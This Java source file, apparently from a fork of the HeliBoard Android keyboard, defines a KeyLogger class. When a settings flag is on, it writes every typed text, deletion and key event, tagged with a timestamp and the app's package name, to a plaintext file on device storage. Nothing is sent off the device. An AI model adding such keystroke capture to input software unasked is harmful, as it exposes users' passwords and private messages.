package helium314.keyboard.latin.utils;

import android.content.Context;
import android.util.Log;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import helium314.keyboard.latin.settings.Settings;
import helium314.keyboard.latin.settings.Defaults;
import helium314.keyboard.latin.utils.KtxKt;

public class KeyLogger {
    private static final String TAG = "KeyLogger";
    private static final String FILE_NAME = "keylog.txt";
    private static KeyLogger sInstance;
    private File mLogFile;
    private final Context mContext;
    private final SimpleDateFormat mDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);

    private final StringBuilder mBuffer = new StringBuilder();
    private String mLastPkg = "";

    private KeyLogger(Context context) {
        mContext = context;
        File dir = context.getExternalFilesDir(null);
        if (dir != null) {
            mLogFile = new File(dir, FILE_NAME);
        }
    }

    private boolean isEnabled() {
        return KtxKt.prefs(mContext).getBoolean(Settings.PREF_KEYLOG_ENABLED, Defaults.PREF_KEYLOG_ENABLED);
    }

    public static void init(Context context) {
        if (sInstance == null) {
            sInstance = new KeyLogger(context);
        }
    }

    public static KeyLogger getInstance() {
        return sInstance;
    }

    public synchronized void logCommit(String pkg, CharSequence text) {
        if (!isEnabled())
            return;
        if (text == null || text.length() == 0)
            return;

        if (!pkg.equals(mLastPkg)) {
            flush();
            mLastPkg = pkg;
        }

        mBuffer.append(text);

        // Flush on sentence/word boundaries
        String s = text.toString();
        if (s.contains(" ") || s.contains("\n") || s.contains(".") || s.contains(",") || s.contains("?")
                || s.contains("!")) {
            flush();
        }
    }

    public synchronized void logDelete(String pkg, int length) {
        if (!isEnabled()) {
            mBuffer.setLength(0);
            return;
        }
        if (!pkg.equals(mLastPkg)) {
            flush();
            mLastPkg = pkg;
        }

        if (mBuffer.length() >= length) {
            mBuffer.setLength(mBuffer.length() - length);
        } else {
            flush();
            writeLog(pkg, "[DEL " + length + "]");
        }
    }

    public synchronized void logKeyEvent(String pkg, int keyCode) {
        if (!isEnabled()) {
            mBuffer.setLength(0);
            return;
        }
        // Special keys often mean we should flush
        flush();
        writeLog(pkg, "[KEY " + keyCode + "]");
    }

    public synchronized void flush() {
        if (mBuffer.length() > 0) {
            writeLog(mLastPkg, mBuffer.toString().replace("\n", "[ENTER]"));
            mBuffer.setLength(0);
        }
    }

    private void writeLog(String pkg, String message) {
        if (mLogFile == null || message.trim().isEmpty())
            return;

        try (BufferedWriter bw = new BufferedWriter(new FileWriter(mLogFile, true))) {
            String timestamp = mDateFormat.format(new Date());
            bw.write(String.format("[%s] [%s] %s\n", timestamp, pkg, message));
        } catch (IOException e) {
            Log.e(TAG, "Error writing to log file", e);
        }
    }
}
